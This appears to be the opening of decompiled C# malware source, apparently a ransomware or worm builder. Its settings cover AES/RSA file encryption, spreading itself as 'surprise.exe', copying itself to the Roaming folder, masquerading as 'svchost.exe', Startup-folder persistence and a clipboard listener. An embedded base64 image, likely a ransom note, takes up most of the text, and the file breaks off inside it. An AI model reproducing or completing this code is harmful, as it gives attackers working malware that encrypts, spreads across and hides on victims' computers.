using System;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

namespace ConsoleApplication7;

internal class Program
{
	public static class NativeMethods
	{
		public const int clp = 797;

		public static IntPtr intpreclp = new IntPtr(-3);

		[DllImport("user32.dll", SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool AddClipboardFormatListener(IntPtr hwnd);

		[DllImport("user32.dll", SetLastError = true)]
		public static extern IntPtr SetParent(IntPtr hWndChild, IntPtr hWndNewParent);
	}

	private static string userName = Environment.UserName;

	private static string userDir = "C:\\Users\\";

	public static string appMutexRun = "7z459ajrk722yn8c5j4fg";

	public static bool encryptionAesRsa = false;

	public static string encryptedFileExtension = "";

	private static bool checkSpread = true;

	private static string spreadName = "surprise.exe";

	private static bool checkCopyRoaming = true;

	private static string processName = "svchost.exe";

	public static string appMutexRun2 = "2X28tfRmWaPyPQgvoHV";

	private static bool checkStartupFolder = true;

	private static bool checkSleep = false;

	private static int sleepTextbox = 10;

	private static string base64Image = "/9j/4AAQSkZJRgABAQEAYABgAAD/2wBDAAIBAQIBAQICAgICAgICAwUDAwMDAwYEBAMFBwYHBwcGBwcICQsJCAgKCAcHCg0KCgsMDAwMBwkODw0MDgsMDAz/2wBDAQICAgMDAwYDAwYMCAcIDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAz/wAARCAFxArgDASIAAhEBAxEB/8QAHwAAAQUBAQEBAQEAAAAAAAAAAAECAwQFBgcICQoL/8QAtRAAAgEDAwIEAwUFBAQAAAF9AQIDAAQRBRIhMUEGE1FhByJxFDKBkaEII0KxwRVS0fAkM2JyggkKFhcYGRolJicoKSo0NTY3ODk6Q0RFRkdISUpTVFVWV1hZWmNkZWZnaGlqc3R1dnd4eXqDhIWGh4iJipKTlJWWl5iZmqKjpKWmp6ipqrKztLW2t7i5usLDxMXGx8jJytLT1NXW19jZ2uHi4+Tl5ufo6erx8vP09fb3+Pn6/8QAHwEAAwEBAQEBAQEBAQAAAAAAAAECAwQFBgcICQoL/8QAtREAAgECBAQDBAcFBAQAAQJ3AAECAxEEBSExBhJBUQdhcRMiMoEIFEKRobHBCSMzUvAVYnLRChYkNOEl8RcYGRomJygpKjU2Nzg5OkNERUZHSElKU1RVVldYWVpjZGVmZ2hpanN0dXZ3eHl6goOEhYaHiImKkpOUlZaXmJmaoqOkpaanqKmqsrO0tba3uLm6wsPExcbHyMnK0tPU1dbX2Nna4uPk5ebn6Onq8vP09fb3+Pn6/9oADAMBAAIRAxEAPwD+f+iiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKK9B8f+CNL0T4V6JqVrbeXe3fkedJ5jnfuhZm4JwOQOgrOdVQai+p7OW5JXx2HxGJpNJUI80r3u1e2lk9fWx59RXoPj/wAEaXonwr0TUrW28u9u/I86TzHO/dCzNwTgcgdBXM+G/h1rPi6xa50+z+0QpIYmbzUTDAA4wzA9CKmFeEo8+y8zqzDhXMMLjI4CMPa1JRU7U1KWjV9rX066W8zEorQ8SeFr/wAI3y22oQfZ5njEqrvV8qSRnKkjqDVvw38OtZ8XWLXOn2f2iFJDEzeaiYYAHGGYHoRV+0go8zeh5lPKMdUx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zW0+o74biNopF+zxDcrDBGQuehrmaKiVOEneSuehhM3x2EpypYWtOEZbqMmk/VJ6/MKKKKs88KKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAoru5vhBYaZ4VsNV1DX/sUN/HGyj7C0m1nTft+Vs9AecdqyvHPw3l8I2NpfQXH2/TL2NGjufLEWWYMwXYWLfdGc474rGOIpydk/zPpcZwhm2Foyr1qatFKTtOEmoy2k4xk5JPu1Y5miu28GfC7S/G2yK18Q/6b5Anmg+wP+66BhuLAHBYDjrXKa9pn9ia5eWe/wA37JO8G/bjftYrnHbpVRqxlJxW6OPG5BjcJhYY2tFezm7KUZwkm1q17snZrrexUooorQ8YKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiur8VfDH/AIRnwPpus/bfO/tDyv3Pk7fL3xl/vbjnGMdKiVSMWk+p6GDyrFYulVr4eN40lzSd0rLa+r1+VzlKKKKs88KK6vwr8Mf+Em8D6lrP23yf7P8AN/c+Tu8zZGH+9uGM5x0rlKiNSMm0uh6GMyrFYSlSr4iNo1VzRd07ra+j0+dgorq/FXwx/wCEZ8D6brP23zv7Q8r9z5O3y98Zf7245xjHSuUohUjNXiGZZVisvqqhi48smlK109Hqno2FFFFWeeFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQB7N4w06w1P4O+Hk1DUf7MhEdsyy/Z2m3N5B+XC89CTn2rlPid49sNT8K6XoWnyfbYbCOJmu9rR7mRGTbsYZ6EHOe+Km8f+N9L1v4V6Jptrc+be2nkedH5bjZthZW5IweSOhrz6uDDUNOad9G9D9W414qUaksLl/I1UpU4znFuTaS1j8TgrPe0VLzPQf2b/8AkeLr/rxf/wBGR1ynjz/keNZ/6/p/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